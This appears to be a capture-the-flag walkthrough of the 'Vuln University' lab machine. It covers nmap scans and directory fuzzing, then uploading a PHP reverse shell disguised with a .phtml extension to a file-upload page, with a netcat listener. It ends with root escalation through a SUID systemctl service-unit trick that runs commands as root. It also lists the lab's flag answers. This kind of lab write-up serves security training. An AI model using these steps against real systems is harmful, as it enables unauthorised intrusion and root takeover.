Ports Scan 
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```

Services Scan

```
PORT     STATE SERVICE        REASON         VERSION
21/tcp   open  ftp            syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh            syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn    syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  Fetbios-:6^ syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy     syn-ack ttl 61 Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http           syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m03s, deviation: 2h53m13s, median: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-01-23T16:57:08
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-01-23T11:57:08-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38501/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 48523/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60946/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41451/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```

Web fuzzing
```
/images               (Status: 301) [Size: 318] [--> http://10.10.14.45:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.14.45:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.14.45:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.14.45:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.14.45:3333/internal/]
```

/internal/
![[Pasted image 20240123140719.png]]
We tried to send a php reverse shell file and php files are blocked

we made a wordlist with 
```
.php
.php3
.php4
.php5
.phtml
```

We made a sniper attack with burpsuite to find a valid extension
 Now we know what extension we can use for our payload we can progress.We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you’ll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell here.

To gain remote access to this machine, follow these steps:

Edit the php-reverse-shell.php file and edit the ip to be your attacker machine ip.
Rename this file to php-reverse-shell.phtml. You can do this by running:

mv php-reverse-shell.php php-reverse-shell.phtml
2. We’re now going to listen to incoming connections using netcat. Run the following command:

nc -lvnp 1234
3. Upload your shell and navigate to http://<target ip>:3333/internal/uploads/php-reverse-shell.phtml — This will execute your payload

4. You should see a connection on your netcat session


Gaining a connection!
Note: remember to shut down your Burp Suite interceptor!

Answer: No answer needed

What is the name of the user who manages the webserver?

Have a look at the home directory :)


Looking in the home directory
There is a home directory for bill here!

Answer: bill

What is the user flag?


Finding the user flag
There is a file called user.txt in bill’s home directory.

Answer: 8bd7992fbe8a6ad22a63361004cfcedb

Task 5 (Privilege Escalation)
Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

Questions
On the system, search for all SUID files. What file stands out?

We can use the following command to list SUID files:

find / -user root -perm -4000 -exec ls -ldb {} \;
/bin/systemctl stands out, at it is used to control and monitor services!

Answer: /bin/systemctl

Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)

We can find some more info on GTFObins:
https://gtfobins.github.io/gtfobins/systemctl/#suid

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
This is pretty complicated! What we do is creating a service, which reads the root flag and outputs it to /tmp/output. This service is saved in a variable called TF. Finally, we run the service.

Proceed by reading the /tmp/output file and you will find the key!

Answer: a58ff8579f0a9270368d33a9966c7fd5

Well… we did not get root did we now?

I just wanted you to show you a simple case first before showing you how to get root. The principle is basically the same. But instead of writing:

ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output on line 4 we write the following:

ExecStart=/bin/sh -c “chmod +s /bin/bash”

Which is similar in the way that we start up a shell, but instead of outputting the flag to a text file, we instead give ourselves execute privileges on bash.

